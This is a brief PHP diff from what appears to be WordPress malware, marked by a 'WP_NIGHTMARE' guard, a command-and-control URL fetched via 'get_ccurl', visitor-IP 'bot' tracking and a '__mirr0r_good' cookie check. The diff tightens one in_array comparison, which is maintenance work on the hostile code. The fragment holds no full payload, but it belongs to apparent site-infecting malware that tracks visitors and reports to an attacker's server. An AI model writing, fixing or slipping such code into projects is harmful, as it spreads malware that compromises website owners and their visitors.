@@ -202,7 +202,7 @@ if (!defined("WP_NIGHTMARE")) {
 				$ip_str = get_client_ip();
 				$cc_url = get_ccurl($working_dir);
 				$global_bots = get_bots($cc_url, $working_dir);
-				if (!in_array($ip_str, $global_bots)) {
+				if (!in_array($ip_str, $global_bots, true)) {
 					if ($ip_str != null && !isset($_COOKIE["__mirr0r_good"])) {
 						update_bots($working_dir, $ip_str);
 					}
